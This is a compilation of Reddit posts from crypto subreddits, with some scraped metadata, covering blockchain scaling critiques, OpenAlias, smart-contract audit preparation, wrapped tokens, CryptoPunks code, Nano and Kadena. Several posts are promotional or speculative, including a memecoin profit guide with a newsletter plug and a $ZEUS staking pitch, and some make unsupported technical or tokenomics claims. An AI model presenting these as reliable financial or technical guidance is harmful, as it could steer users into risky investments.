problem in crypto for the last decade has been has been: how do we scale layer-1? specifically, how do you shard/partition layer-1 ledger state. it has been a unsolved problem for so long, and so many bs ""solutions"" have been pitched, that most people have given up on decentralized layer-1 scaling being a solvable problem (and have turned to centralized and/or layer-2 solutions instead. --- >polygon 5 keys locking 10billion tvl that's insane, it's not decentralization that's a rugpull waiting to happen, we're in crypto to eliminate trust, and now we trust billions to 5 people, it's asinine that's what it is. --- >algorand interesting tech but terrible tokenomics, almost fully premined and distributed among insiders/team/vcs, smart contract automatically accelerates distribution for ""early backers"", suppressing the price, can't run a node unless you register with the foundation and get approved. --- >bsc chain made to be a pnd heaven nothing more, will not exist in a few years supply given to insiders - 50% --- >zilliqa >tezos tezos is trying to do things right, good smart contracts... sadly both have an unscalable base layer --- >fantom 38 nodes! nice decentralization guys, do you want to know why they are doing this? it's because all deterministic bfts performance degrades with consensus node count (this is a fundamental aspect of dbft and thus all ""fast finality"" pos""). i highly doubt we'll ever see a +200 node pos network with high utilization... pow being probabilistic consensus is a feature that allows for globe spanning trustlessness. furthermore, arbitrary dags have known performance problems under adoption, they initially have many more execution channels, because transactions are largely unrelated, but as adoption picks up and massive dpps appear on the platform the overall performance decreases because transactions become increasingly related --- >avax avax mainnet is unsharded. which means it cannot scale, and again with the dag. their consensus might be nice but is not battle tested. it also seems that avalanche does not even support cross-subnet transactions at all, right now. they have subnets, but they can't communicate with each other and if they cross-subnet transactions, they are very likely not atomic. atomic transactions are very important, because it is given by default on unsharded networks and ensures that multiple sub transactions can be combined in one transaction and if one fails all fail. besides that, the subnets are permissioned = centralized control supply given to insiders - 42% >elrond the main problem of elrond is that it doesn't allow for atomic transactions across shards. meaning if you have dapps which interact with each other (like most defi dapps like uniswap or aave) you need to deploy them in one shard but this leads to having no scalability (because all interacting dapps are limited by the throughput of one shard), so it's basically useless for anything in defi, it's like going a step backwards from ethereum. --- >harmony it's better described as a layer-1.5 scaling solution if we're being generous. their problem that the other shards are shoving work onto shard 0 currently (making it slow down because it's processing the bulk of work) is something that isn't possible with a properly scaled layer-1 solution... or at the very least there's a whole new host of economic problems now that shards can fight over doing the least work. --- >polkadot the problem with polkadot is that they are more or less a collection of independent blockchains. and transactions between parachains are not atomic. this makes them basically a bunch of isolated islands which are unable to scale. supply given to insiders - 35% >cosmos uses hub-and-spoke, which has the liquidity problem that comes with all layer-2 solutions (you have to de-stake from one peer/spoke, settle to hub, then re-stake to new spoke, to transmit funds... and the hub is low bandwidth so that de-stake is expensive). all in all it's pretty alright despite it, but another problem is that atom is token not needed the coin, maybe it will change with the dex though supply given to insiders - 22% --- >near 22 nodes, pretty centralized if you ask me --- >iota >ada vaporware, i don't care what anyone says, if anything launches then i'll reconsider.

"OpenAlias, the best cryptocurrency wallet feature you've never heard of","i just published an article about an essential user experience feature that most people are unfamiliar with: openalias. openalias allows people to send cryptocurrency to human-friendly addresses. i can ask for people to pay justin.ehrenhofer.org instead of my full address. in many cases, this is even easier than sharing qr codes. unstoppable domains and ens have gotten a lot of the recent glory in this area, but openalias has been around since 2014, before ethereum even existed. openalias works for almost any domain, including legacy domains. it's an open standard that solely creates references between addresses (of any cryptocurrency) and human names. that's all; it's dead simple. in theory, unstoppable domains and ens domains and can be configured following the openalias standard, but they use their own crypto record type by default. ens has a txt record that can be used, but it would be difficult to configure with different subdomains. i wrote this piece to explain some of the pros and cons, and to encourage more cryptocurrency wallets to support openalias. the monero community has adopted openalias quite aggressively (all major wallets support it), but it has seem limited adoption in other communities.

How to Prepare for a Smart Contract Audit,"hey r/ethdev, i’m the founder of a cross-chain staking protocol called [brydge](https://brydge.network/). we knew that we’d need a smart contract audit at some point, but had no idea what that entailed, how much it’d cost, or what we actually needed to do before. put together the below guide helps you budding buidlers avoid some of our mistakes! &#x200b; **do i need an audit?** no. should you get one? yes. we ran a proof of concept for months that was unaudited. was it risky? absolutely. you’re dealing with real people’s $$ here. shipping unaudited code means betting your personal + company’s reputation that you’re a perfect developer. perfect developers don’t exist. my two cents—ship your proof of concept, get some validation. if your idea is a hit, set up an audit yesterday. bonus—audit report makes your protocol look more legitimate. &#x200b; **how much do audits cost?** depends on the auditor, your code length + readability, and current demand. our 560-line protocol was quoted $8k by pessimistic, $40k by certik (negotiated down to $15k), and \~$25k by peckshield. &#x200b; **how long does it take to get started?** depends on demand. shortest was 2-3 weeks, longest 6 weeks. you can pay extra with most auditors to skip the line. above quotes reflect standard wait time / cost. &#x200b; **what do i need to do before being audit ready?** first step is to finalize your repo. the more readable your code is, the less time the auditor spends going through it, and the less $$ you pay. you want as close to 100% test coverage as possible and continuous integration set up. then, write up documentation. consensys has a good breakdown [here](https://consensys.net/diligence/blog/2019/09/how-to-prepare-for-a-smart-contract-audit/). in short, you need an essay explanation explaining what your code is supposed to do in each module / function. more detail = lower bill to pay. &#x200b; **are some auditors better than others?** up for debate. some (consensys, trail of bits, certik) have audited more blue chip protocols, and charge more because of it. at the end of the day, you’re relying on the 1-2 developers going through your code, as well as the rigor of the auditor’s formal process. recommendation: offset risk by planning for a second audit with another firm. &#x200b; **how should i view our auditor? the solidity police, a consultant, or a final security guarantee?** as just checking a box. auditors are experienced solidity developers who have read and written a lot of lines of code. they’ll (hopefully) catch some things you won’t. but, just like the benefits stemming from if your protocol takes off, if your protocol is hacked the blame does not fall to your auditor. it’s on your core team. your team is your internal auditing service. hiring a third party is just getting an extra set of eyes on it. auditing ≠ security guarantee. wormhole was audited thoroughly, and was still sniped for $330mm. &#x200b; **what do auditors actually look at?** generally, just smart contracts. if you’re building a relayer system that has a ton of trigger logic off-chain, talk to your auditor about taking a look through this too. they’ll likely do this for you, but it’ll be an extra charge. &#x200b; **do auditors charge for imported libraries?** no. your openzeppelin safemath lib will not incur an extra auditing charge. please use as many external (audited) libraries as possible. &#x200b; **how does an audit work?** 1. you present your repo to the auditor 2. the auditor returns a quote, estimated start time, and estimated finish time 3. you negotiate this quote and agree to a start date 4. you pay an upfront deposit to lock in the date 5. once the date rolls around, you turn over your most recent commit hashes and documentation 6. the auditor goes through your protocol and returns to you a list of vulnerabilities 7. you fix these vulnerabilities and return the final commit hash to the auditor 8. the auditor verifies fixes and presents you a final pdf report outlining the audit results &#x200b; **what shows up in an audit report?** the good, the bad, and the ugly. if you have a gaping security flaw that’s caught and fixed, your report will show this. this is standard practice across the industry. &#x200b; **do i need to open source my contracts for them to be auditable?** no. it’s more common to open source your contracts, but not required. your audit report will just specify that your repo is private. &#x200b; **tips:** 1. negotiate your audit cost 1. customer acquisition is expensive for auditors. they sell the same service. pit quotes against each other. they don't want to lose your lifetime business to a competitor. 2. budget for more than expected 1. stuff runs over, be prepared. 3. plan for a second audit 1. logic explained previously. 4. don’t rush to hit a deadline, push back your audit 1. auditors highly prefer this and will 100% be willing to work with you. they’re devs too. they will not send you to the back of the line if you push back your start date by a bit. be upfront if you need to do this, they will understand. hope this is helpful, happy buidling!",62,36,0.99,2022-02-14 20:46:40,web3,ethdev,the_altoid_road,False,61.49999999999999

Can layer 2 scalability really undermine Ethereum’s value?,"lately, i’ve been seeing more and more posts, mostly on x, explaining why, in their opinion, it’s now certain that the price of eth can only go down. their argument is that ethereum’s scalability, based on l2, leads to a growing reduction in users who rely on l1, and that the fees paid by l2s to l1 are extremely low (almost free), which translates into lower revenues for l1. so if the l2s roadmap plays out, it would basically result in a divergence between ethereum l1 utility (increasing by number of users on l2s settling on ethereum) and eth price (decreasing by lower fees geenrated for l1). another argument that’s often heard is that the most successful l2s in the medium/long term will completely detach from ethereum, becoming independent l1s and taking their user base with them. regarding this last argument, i find it unlikely since the value of ethereum lies precisely in its degree of decentralization and censorship resistance, and that’s not something l2s can easily achieve overnight. so, unless an l2 wants to become a centralized l1 like others, it wouldn’t make sense to detach from ethereum. as for the first argument, the issue of fees paid by l2s to settle transactions on l1 is definitely relevant. currently, they are very low, but that doesn’t mean it can’t change in the future. after all, ethereum’s main value is to provide a decentralized, censorship-resistant layer for settling transactions. being the only chain with these characteristics, aside from perhaps bitcoin, ethereum l1 should charge appropriate fees to l2s for settlement. what do you think?",42,69,0.84,2024-10-12 04:15:40,web3,ethereum,revyth,False,61.199999999999996

Is Solana on the same trajectory with Ethereum in last bull run?,i am confident solana will see a major spot etf approval that could have a significant impact on its price just like we saw with btc and eth but sol seems to taking similar price pattern to eth in last bull run. btc prior to its major move in 2021 retested and bettered its previous ath in nov/dec 2020 while eth was also on track to retest it ath.. we could be seeing a similar trajectory for solana considering its recent price action. sol may have the potential to replicate eth success but i feel it need a solid fundamental to get that push just like firedancer impact late last year. with spot etf not likely to happen in this bull circle what could be that factor to look forward to and how high can it go in this bull run,59,42,0.87,2024-11-17 04:54:27,web3,solana,Koiguy94,False,60.900000000000006

What is the actual end-game usage for cryptocurrencies?,"looking for honest discussion, because i really cant agree with the end goal being using crypto in place of fiat. i know that is what most people hope for but it doesn't seem plausible. 1. why would you spend something you think will gain value, on lets say a pair of socks? 2. why would any business accept a currency that has the potential to decrease in value? 3. cryptos are mostly anti-government. why would a business accept payment in a currency that they cannot pay taxes/bills with, and will owe extra taxes on if they gain value? 4. finally, the only way all of this would work is if the cryptocurrency in question is completely stable. which leads to the question, what then would be the point? cryptos have been classified as assets, they are somewhere in between straight fiat and a stock. in my point of view they are almost like the worst of both worlds....a fiat that can change value rapidly and a stock that's value isn't determined by the company its associated with. disclaimer: i am a huge believer in blockchain technology and their future...but cryptocurrencies themselves seems to have no real use. thanks in advance for your input",55,48,0.86,2018-04-06 12:55:54,web3,CryptoTechnology,snorkleface,False,60.800000000000004

Help me understand CryptoPunks source code,"from what i understand, there were originally 10k punks, each with a unique id from 1-10000. cryptopunks was created before erc-721, so it was an early way to support nft’s using erc-20. what i don’t understand, however, is how the source code has any idea of what the specific token’s image is. [the source code](https://github.com/larvalabs/cryptopunks/blob/master/contracts/cryptopunksmarket.sol) includes a string public imagehash = ""ac39af4793119ee46bbff351d8cb6b5f23da60222126add4268e261199a2921b""; and includes a png of the entire cryptopunks image set. if you hash this image, you obtain the imagehash above. however, the imagehash isn’t used anywhere in the source code, aside from being defined. so, if i’m understanding correctly, is the artwork/properties simply being generated on the [actual website](https://www.larvalabs.com/cryptopunks) server-side? as in, they have a list of properties (eg. 'cap', 'alien', 'beard', etc.) associated with every id that's stored on their website (and not on the blockchain). then, when you visit their site, it fetches all the id's on the blockchain, who they're owned by, any bids, etc. and they display that on the punk's page? if this is the case, how can it be verified that some of the specific properties of the nft are true? for instance, if you look on [specific punks](https://www.larvalabs.com/cryptopunks/details/2890), you can see properties like “alien”. in other words, if the website were to disappear tomorrow, how would those who own the punks know what accessories each punk has? furthermore, how is [opensea](https://opensea.io/collection/cryptopunks) able to get the image associated with each id? or did they manually program this in, since cryptopunks took off?",62,35,0.96,2021-05-21 16:15:11,web3,ethdev,greentriangles1,False,60.8

🚀 Wen Bull Run?

What one can learn from browsing 30 million Ethereum addresses,"on march 30 we surpassed 30 million ethereum addresses. of course that means that there are still only few million people actively using ethereum to either launch contracts, send ether or tokens. but the beauty (or the curse) of the ethereum blockchain is that their moves are public and we can track them. why would we? at least 3 reasons come to mind: * cause we can 'follow' an investor we admire and see what they are buying/selling & when * we can track what projetcs what raised money in an ico are doing with it. moving or keeping? can also try to estimate how much runway they still have looking at the date they sent ether to an exchange to get fiat * to explore them for research purposes and as i am building with my team a tool to enabling discovery & research of the ethereum blockchain (you can check it out at www.trivial.co) - you can add any address to your favorites and track what the address is doing (it will appear on the news section on the main page & in your favorites. i want to ask you what other criteria would be useful for you apart the ones that we've already marked down: * by tokens addresses hold * by being a top holder of something * by ether wealth (e.g. see only accounts that hold more than xx of ether) * by total wealth (incl all the tokens value) * by account birth date * by nb of txs what else?",71,21,0.97,2018-04-05 22:35:59,web3,CryptoTechnology,kelluk,False,60.7

How to get rich in memecoins (without trading):,"i get it, not everyone wants to gamble their money on random funny (or not) memes. so here are 2 alternative ways of profiting from memecoins: first way: dlmm farming i know, this sounds like some pro-level defi genius-only thing. but it’s not. what you have to do is simply provide liquidity for memecoins on meteora and you will earn fees from people trading it. here’s how: 1. go to the dlmm tab on meteora 2. pick a pair: look for low tvl, high-volume pairs. balance risk with potential rewards. 3. go to add liquidity 4. set a range: more bins = less risk, lower fees. 5. choose a strategy: • spot: all-purpose, easy. • curve: for stable pairs. • bid-ask: great for volatility. 6. deposit your liquidity and start earning fees this is nfa, please learn more about liquidity pools and impermanent loss before depositing. second way: memecoin branding studio memecoins thrive on social media content, and that’s where the magic happens. i’ve cornered matt, founder of xd studio—the genius behind viral content for top memecoins—and got him to spill the tea on how much you can earn creating art for memecoins. here’s what he shared (after a little persuasion): most deals are monthly, but individual prices are: • animated gifs - $100+, art - $100-$200+. • 50+ brands signed this year • high 6-figure annual revenue this business model is nearly perfect: it has little downside risk but a high upside potential. crypto companies typically pay more than other industries, allowing you to have way higher margins. hope this was useful. for more actionable crypto ideas like this - check out my free newsletter called touching grass (link in bio)",52,53,0.83,2024-11-14 13:13:41,web3,solana,NikBit999,False,60.7

The problem with the EigenLayer airdrop,"the controversy around eigenlayer’s eigen token airdrop shows why decentralization and democratic governance must be prioritized in crypto. allocating a significant share of tokens to investors and early contributors, while excluding specific regions, contradicts the ethos of decentralized finance and raises concerns about fairness. the inability to immediately transfer the tokens also limits the community’s involvement, leaving early supporters feeling sidelined. in a space meant to challenge traditional finance, defi projects must embrace truly decentralized, democratic approaches. i like how exocore does this, but there are many examples. they do this by prioritizing fair representation, community-driven governance, and permissionless access. their commitment to a transparent and open protocol ensures that every voice matters, embodying the ideals of crypto in ways that build trust and inclusivity. for crypto to thrive, projects need to move past centralized control and embody the principles of decentralization, ensuring that the community comes first. ultimately, the eigenlayer airdrop controversy serves as a stark reminder of the importance of embracing decentralized and community-driven values in the crypto ecosystem. as we witness projects like exocore exemplify these principles by prioritizing inclusivity and fair governance, it's clear that decentralization is not just an ideal but a practical necessity for the evolution of defi. moving forward, projects that prioritize the community, transparency, and democratization will be the ones that set the standard and secure the trust and participation of hodlers worldwide.",82,4,0.98,2024-05-01 20:55:34,web3,defi,berke7689012,False,60.599999999999994

What is the goal?,"whoever linked this sub on /r/cryptocurrency, you are a gem. i have been into cryptocurrency since the 2017 bullrun. back then, i joined in only for the hype, but at least it gave me exposure to what crypto was at a relatively young age. fast forward 3 years, and as soon as covid restrictions & government over reactions hit, i knew i needed to get back into crypto again. this was an amazing untapped hedge against inflation that would soon spook the market. ever since then i have been learning more and more about the technology and enjoying the gains on the way up. however i am noticing a pattern reminiscent of 2017 where there are just hype investors everywhere and the focus is solely on the price and 'buying the dip'. greed founded by smoky speculation of these coins true value rules the market. this is my big question with crypto. i get that it is a whole new asset class and the value is super hard to determine. however, because of the tough determination of value, we are seeing the original value proposition of crypto currencies being eroded time and time again. correct me if i'm wrong here, but isn't the true point of crypto to provide a stable decentralised new financial paradigm for everyone? won't true success come when many of the best crypto projects reach a point where the supply and demand is as liquid & stable as fiat? is the goal here for btc to become the new world reserve currency and for people to start thinking in terms of btc value rather than fiat value? if so, just how far away are we from that goal? it seems to me that most people out there have something at the back of their minds that recognises the need and value for a new economic paradigm, however it also seems that bear and bull markets just continually erode this goal. is this because this is a decentralised asset which in turn behaves completely differently to any other financial system implemented in history? how does a humanity so conditioned to value determined for them accurately determine the value of something they have complete autonomy over? forgive me for not actually going into the tech. i believe that some of the tech is already there (xmr) and other good projects will continue to evolve with time, but i guess my big question is a more of a philosophical/economical one in that how do you personally view the transition to the 'information age' and cryptos role in it?",53,46,0.95,2021-05-18 02:47:40,web3,CryptoTechnology,truerightiealt,False,59.7

SDK Tools for Devs: A Game-Changer for Privacy & Security in Web3,"hey everyone, in the dev space, i feel like we always strive for a balance between functionality, privacy, and compliance, especially in the current market. i’m always in the know with tools but recently findora (l1 solution) [released a triple masking sdk](https://www.investing.com/news/cryptocurrency-news/findora-launches-triple-masking-sdk-combining-privacy-with-auditability-3067533) that helps developers and project owners address these issues. to keep it brief, the technology works by enabling integration of zero-knowledge proofs into dapps, allowing private transactions to remain auditable for regulatory compliance. the triple masking sdk offers three levels of optional transaction privacy: masking wallet addresses, asset type, and amount sent. despite the privacy, transactions remain auditable through integrated asset tracing capabilities. built on application-specific turbo-plonk zk circuits, the sdk is faster than industry benchmarks and scales to thousands of transactions per second. it’s also compatible with the secp256k1 curve, allowing wallets like metamask to sign transactions, making it easy for users to access privacy-enhancing features. i find it important to support projects that are making actual tools rather than rinse and repeat projects with a token. i plan on using this sdk myself for my upcoming project as it’s an easy way to provide credibility and auditability when communicating with your community. let me know what you guys think, are there other solutions/tools that are commonly used?",72,17,0.96,2023-04-28 12:00:59,web3,CryptoTechnology,Organic_Bluejay_8400,False,59.6
What Is A Wrapped Token?,"a wrapped token is a cryptocurrency whose value is pegged to that of another. it is called a wrapped token because the original cryptocurrency is wrapped so that its wrapped version can be created on another blockchain. a wrapped token is much similar to a stablecoin. a stablecoin derives its value from another asset, usually fiat currency. in the case of a wrapped token, it derives its value from an asset created on another blockchain. wrapping tokens is a way of creating bridges between tokens issued on different blockchains. wrapping tokens enhances interoperability. interoperability is the concept that allows compatibility between different blockchains. imagine if someone who uses the chrome browser could not send an email to another who uses a different browser such as internet explorer or safari. there are different types of wrapped tokens, the same way that there are different kinds of stablecoins. ## different types of wrapped tokens the different models of wrapping are nothing more than different routes taken to get to the same destination. ### centralized this method relies on using a firm to maintain the value of your assets. you deposit your btc into a centralized third-party. the intermediary locks up your crypto assets in a smart contract, mints a new erc-20 token, and sends it to you. bitgo is an example of a firm offering this kind of service. however, the downside is that you are fully dependent on this intermediary to keep its own end of the bargain. ### trustless you can wrap your bitcoins using a decentralized method. the custodial responsibilities are managed by smart contracts. your bitcoins are locked in a network contract that cannot be altered without your approval. ### synthetic assets this model is slightly different from the two discussed above. you lock your btc into a smart contract and in return, you get a synthetic asset with equal value. however, your synthetic asset is not backed by btc directly. it is backed by native tokens of the platform. ## how wrapped tokens work......

ELI5: How Are Dapps Any More De-Centralized Than The Platforms We Currently Use?,"i was browsing r/ethereum this morning, and i saw a cool post where a student in australia was able to pull up his/her test scores on a blockchain powered by ethereum. this is really, really cool -- i thought: “wow! this is only the beginning for real world ethereum use cases.” i’m having some trouble understanding how this example concretely looks like, which is why i wanted to solicit help from this community, to hopefully understand the concept of ethereum a little bit better :) forgive me if i butcher this explanation; i’m new to this whole blockchain stuff and i’m outlining this in the best way that i can best understand it: \------------------------------------------------------------------------------------------------------------------- okay, so in the australian test score example, i’d imagine there is some sort of decentralized application (dapp) the australian school system (a.s.s. for short) uses to post student test scores. to keep random hackers (or trolls) from posting false test scores on this blockchain and trolling up the entire grade posting, i’d imagine the a.s.s. needs some sort of gate-keeping code to say: “only those who verifiably work in the a.s.s. can publicly post blockchains on this dapp”. this, most likely, requires some sort of login/password system; only those with a.s.s. -verified accounts can make postings/edits. though, this got me thinking: yes, we are keeping student grade data on a decentralized blockchain, but at the end of the day, access is still centralized under the dapp. i understand the security of keeping something on the ethereum blockchain itself, but couldn’t a hacker instead steal the a.s.s. login credentials on the dapp, and make all sorts of fake grade postings? i understand that it is more secure to keep (student) data on a blockchain, because once posted on the blockchain, it can never get erased/wiped off the blockchain. however, when it comes to security of “who is making new posts on the blockchain”, i’m having trouble understanding how centralizing access on a dapp is any more secure than centralizing (student) data across a school-shared (microsoft?) drive. \---------------------------------------------------------------------------------------------------------------------- thanks in advance for reading this post! i want to believe in the long-term adoption of ethereum, but i’m having trouble getting comfortable around this idea of keeping access/login keys on centralized platforms. any and all help, feedback on this concern is appreciated, fellow redditors!",61,33,0.96,2021-06-12 13:18:16,web3,CryptoTechnology,tatertotsume,False,59.400000000000006

Is IOTA's Shimmer a completely new DLT Consensus Mechanism on par with (if not by far superior to) Proof-of-Work and Proof-of-Stake?,"i originally posted this on r/cc but was told that it would be appreciated here. so let's have a dicussion on this! # what is shimmer? *shimmer* is one of iota's coordicide modules, in my opinion the most interesting one. simplified explanation: [https://coordicide.iota.org/module5.1](https://coordicide.iota.org/module5.1) formal explanation in section 6.2.2 (p.23) of the [coordicide whitepaper](https://files.iota.org/papers/coordicide_wp.pdf) &#x200b; i urge you to read the formal explanation to fully get the idea. anyways, since i cannot expect everyone to read it, i will try to describe it in my own words: &#x200b; *shimmer allows to resolve conflicts (e.g. double spends) through a dynamic self-adjusting voting mechanism. nodes signal their opinion on which of the conflicting transactions they prefer and readjust their opinion based on their neighbors. they do not only consider their immediate but also more distant / indirect neighbors. this way the entire network quickly tips over into a stable, practically irreversible state that favors exactly one of the conflicting transactions, thus solving conflicts by reaching global consensus without the need of a central synchronized block chain which would limit the throughput.* # what does this mean for crypto? &#x200b; i feel like **iota just invented a new consensus mechanism for dlt**. this is neither pow nor pos but something completely different in nature yet simultaneously so simple. it appears to me with their approach, iota has just revolutionized dlt. this to me seems to be changing the entire landscape of cryptocurrency and looks **at least as revolutionary as both pow and pos**. i would even go one step further and argue that it is **technically superior to both** since it does neither waste useless energy (pow) nor requires any kind of global syncing (pow: global blockchain, pos: global consensus on block issuer). once implemented, this would make iota: * truly decentralized (no miners, stakes or central block issuer) * partition-tolerant (dag, no central entity) * feeless (no miners, no blocks) * scalable (no syncing required and no bottleneck like blocks) &#x200b; i would really really love to hear other people's opinion on this, especially technical arguments. if true, the introduction of this new mechanism would be the biggest technical advancement for crypto as a whole this year. keep it mind, it is not implemented yet but i think we now have enough technical details to reason about the theory behind it.",67,27,0.82,2019-05-29 04:05:24,web3,CryptoTechnology,[deleted],False,59.2

The Need for Privacy on the Blockchain,"while blockchain networks are more secure than existing web solutions due to their decentralized architecture, this same technology has become a point of concern for data privacy. by comparison, web 3.0 brings a disruptive change to the existing internet infrastructure (web2) and is fully decentralized, giving users more control over their data and transactions. however, the decentralized universe is very fragmented. hundreds of dapps and defi protocols are deployed across multiple blockchains. as a result, users are frequently required to perform cross-chain transactions in which they connect their personal data (crypto wallet, kyc documents, etc.) to various platforms operating across multiple blockchains. these numerous transactions may result in data infringement attempts. as a result, a strong combination of interoperability and privacy-focused solutions will provide users with greater assurances when transacting on the blockchain. the transparent nature of public blockchains makes defi users vulnerable to surveillance without their knowledge. in essence, blockchains are secure, but on-chain privacy is limited. to avoid unwarranted tracking, it is imperative that crypto users connect their wallets to privacy protocols in order to protect their transactions and shield their balances from unauthorized parties. defi is growing at an unprecedented rate, with billions of dollars at stake. to top it all, the increasing number of defi, dapps, and protocols across multiple blockchains will only inflate existing privacy-related concerns. as such, privacy-focused blockchain projects will play a critical role in helping ensure that users exert greater control over their data and transactions across the entire web3 ecosystem while leaving blockchains' embedded transparency and decentralization intact.",59,37,0.88,2022-11-16 17:38:36,web3,CryptoTechnology,gywasgusn,False,59.0

Single-Sided Staking Brief Explanation $ZEUS,"single sided staking requires you to have any type of token staked into a liquidity pool rather than the usual requirement of two tokens and i came across $zeus which allows you to just stake one token. zeus finance just launched their form of dual income for node holders allowing them to to stake both $zeus and $usdc and as well as the stability fund. **highlights from their single sided staking profit sharing plan** * higher protocol productivity since the parties involved focus on shared success, with more utility for $zeus * having a stake creates loyalty, and since it’s essentially a performance-based model, it incentivizes the investors to keep staking their $zeus to maintain and grow their stable passive income * zeus finance can scale revenue-sharing payment models without additional capital injections, branching out into new models looks like zeus finance has some bigger plans coming up as this will be one of the many tools they plan to release to help ensure everyone's defi's needs.

"Addressing Nano's weaknesses (bandwidth usage and disk IO). Nano voting traffic to be reduced by 99.9% by implementing vote by hash, lazy bootstrapping, and reduced vote rebroadcasting (x-post r/CryptoCurrency)","voting traffic currently dominates the nano network (vs actual transactions), because of the size of the votes, the number of times nodes vote, and the number of nodes those votes get rebroadcasted to. this reduces node throughput, makes it harder for low-end nodes to survive increases in transaction traffic, and reduces overall network scalability. the nano devs are now implementing a number of interesting solutions that should drastically reduce the voting bandwidth (99.9%) and required disk io of the nano protocol, which are the network's two biggest bottlenecks. vote by hash - initial reduction from 40 kilobytes of voting traffic per block to 600 bytes per block (98.5% reduction) by not including the full block in each vote and only using the block's hash. lazy bootstrapping - right now a block may get voted on thousands of times during it’s lifetime by nodes that don’t actually care about the block or chain it’s on — and they’ll vote on other blocks which reference that block indirectly, leading to thousands of unnecessary votes. passively listening for blocks and only pulling down chains that a node cares about solves this, and drastically reduces overall voting traffic. vote stapling - votes by reps are signed and distributed with blocks, so that when a node gets a new block that has already been voted on, it will no longer request voting confirmation once more from the representatives. the votes will be sent in a bundle with minimal vote traffic. vote rebroadcasting - since v13, the redundancy of nodes voting 4 times on each block (which in turn are rebroadcast) is no longer needed. this is because nodes now automatically seek them out if they're missing. this leads to lower votes, fewer relays, and will decrease network traffic by 75%. tl;dr: nano is about to get a lot more scalable (99.9% less voting traffic). stress tests will follow. sources: https://np.reddit.com/r/nanocurrency/comments/910kyk/nano_network_status_update/ https://youtu.be/i5d7zzz99b8 https://medium.com/nanocurrency/developer-update-7-23-2018-e7941346bd0f --- correction from one of the devs on vote stapling: > while vote stapling can definitely be used for this (and presumably will be in the future), that's not what it'll be first used for. with vote stapling, when a node publishes a block, it will first communicate directly with representatives to make an aggregate signature. then, the node will publish the block along with the aggregate signature in the same message. the aggregate signature is the same size as a normal signature, because it uses a multisignature protocol called musig: https://blockstream.com/2018/01/23/musig-key-aggregation-schnorr-signatures.html > this means that we can package up the entire voting process into the size of one vote. --- so, what do y'all think? do these sound like viable solutions to improving nano's scaling? what other concerns do you have with nano and its ability to scale?",77,8,0.88,2018-07-29 10:55:35,web3,CryptoTechnology,Qwahzi,False,58.2

How to Scale a Proof of Work Blockchain,"let’s start with the classic computer science parallelization and work from there. if one bitcoin blockchain can do 5 transactions per second (using round number approximations for simplicity), two bitcoin blockchains can do 10 transactions per second, ten blockchains can do 50 tps, etc. but this approach has two major problems: 1. each of these completely standalone blockchains has a completely different currency. ten separate currencies…not so great. 2. a 51% attack becomes a 5.1% attack…not good. kadena’s chainweb protocol solves both of these problems by braiding the chains together. for 2 chains, in addition to making each block include the hash of the previous block on the same chain, **you also have it include the hash of the previous block on the other chain**. this means each chainweb block in a 2-chain network contains one additional hash — i.e. 256 additional bits of information…not bad! but what benefits do we get in exchange? well, if you wait one block after your transaction, it will require the full hash power of both chains to do a 51% attack on that block. and the hash braiding gives us the merkle tree structure needed to do cross-chain spv proofs, yielding a single currency across both chains. so now we’ve solved the two major problems, and the cost is only 256 bits (32 bytes) of additional storage per block. but if we scale this up to, say 10 chains, that starts to add up. if each block in a 10-chain web contains the hashes of the previous block on all other 9 chains, that’s an additional 288 bytes of overhead per block or 2880 bytes per block height — it gets out of hand fast. but there’s hope! it turns out there’s a brilliant result from an obscure branch of math that can save us and solve the proof of work scalability problem! back in undergraduate computer science, we learned a little bit of this arcane branch of math called graph theory. if you didn’t think it was all that interesting, you’re in good company. i didn’t either. but as it turns out it’s just the thing we need to scale blockchains # enter graph theory earlier i mentioned that with two chains, where each chain has the hash of the other chain, we solve both the multiple currency problem and the 5.1% attack problem. if we visualize the way these two chains are connected, it looks like this. we need to scale this up to hundreds or potentially thousands of chains. but first we need to figure out a strategy for how the chains should be connected together. let’s start with 10 chains and explore a few different strategies. the naïve approach would be to have every chain be connected to every other chain. that would look like the image imgur.com/cx5lghj. as we calculated before, this would use way too much space because we have to store an extra 32 bytes for every line attached to a node. it might be doable with 10 chains, but it definitely would be too much with more chains. we need to reduce the number of edges each node has. we could drop down to just two edges for each node. this reduces our storage requirements, but it has a different problem. it takes 5 hops to get from any chain to the chain that is the farthest away. if we scale this up to 100 chains, that would be **50 hops**. this means that with 100 chains, you would have to wait 50 blocks before it would require 51% of the whole network hash power to attack that block. even in blockchains like ethereum with a relatively fast block time, that’s still a long time to wait. that’s also how long it would take to transfer coins from one chain to the farthest chain. so we have a dilemma. we want to minimize **1)** the number of hops it takes to get to the farthest chain, and **2)** the number of chains each chain is connected to. here’s where graph theory saves the day. the number of hops is called the **diameter** of the graph. and the number of edges each node has is called the **degree** (assuming they all have the same number, which is fine in this case). this is a well-known problem in graph theory called the **degree diameter problem**! that is the brilliant result that kadena uses to scale proof of work in what we call the chainweb protocol. # how chainweb works graph theory researchers have been studying the degree diameter problem for a long time. optimal solutions are very difficult to find for large graphs. but it turns out that we know how to construct solutions that are quite good. here’s the 10-chain graph that kadena used at launch. if you examine it closely, you’ll see that every node has three edges (in graph theory parlance, it’s degree 3) and you can get from any node to any other node in at most two hops (diameter 2). this means that we only have to store 3 additional hashes per block and after two blocks you can transfer coins from any chain to any other chain, and you have to have 51% of the entire network hash power to attack any single chain! on august 20, 2020, the kadena network forked from 10 chains to 20 chains. the first 10 chains kept all the same coins and smart contracts that they had before, and 10 new chains came into existence. the graph had a new structure, though. here’s the 20 chain graph. (layer-1 scaling in prod...) the 20-chain chainweb graph still has degree three, but it now has diameter 3, so we have to wait 3 blocks after a transaction before the whole network’s hash power is protecting it. the most amazing thing is how much growth potential the degree diameter problem research gives us as we expand beyond 20 chains. here’s a table that shows the largest known graph size for graphs of **degree d** and **diameter k**. this imgur.com/xicrz62 table means that using a chain graph with a degree and diameter of 7, kadena’s blockchain can scale to more than 50,000 chains! and if we increase the degree and diameter one more to 8, we can get well into the **hundreds of thousands**! conclusion. **kadena’s chainweb protocol leverages graph theory research into the degree diameter problem to scale a tried and true proof of work blockchain easily into the realm that we need for the scale of the global financial system**. as vitalik buterin has pointed out in the past, “the only solution to high tx fees is scaling”. as we have learned above, kadena has solved the scaling problem. --- # tldr: if one blockchain can do 50 transactions per second, two blockchains can do 100 transactions per second, one hundred blockchains can do 5000 tps, etc. but this approach has two major problems * 51% attack becomes a 5.1% attack. * each of these completely standalone blockchains has a completely different currency. to solve the first problem, you need to braid the chains together. for 2 chains, in addition to making each block include the hash of the previous block on the same chain, you also have it include the hash of the previous block on the other chain.now this is good and all for small networks, but it can get out of hand pretty fast 